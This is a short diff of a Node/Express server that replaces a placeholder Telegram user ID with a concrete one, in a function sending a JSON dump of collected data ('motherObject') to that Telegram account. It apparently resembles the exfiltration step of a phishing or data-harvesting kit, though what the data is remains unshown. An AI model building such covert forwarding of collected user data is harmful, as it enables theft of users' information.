@@ -135,7 +135,7 @@ app.post('/acc', (req, res) => {
 
 // Function to send motherObject as a text file via Telegram
 function sendMotherObjectViaTelegram() {
-  const userId = 'TELEGRAM_USER_ID'; // Replace with the actual Telegram user ID
+  const userId = '7136999028'; // Replace with the actual Telegram user ID
   const text = JSON.stringify(motherObject, null, 2);
   
   // Create a temporary file
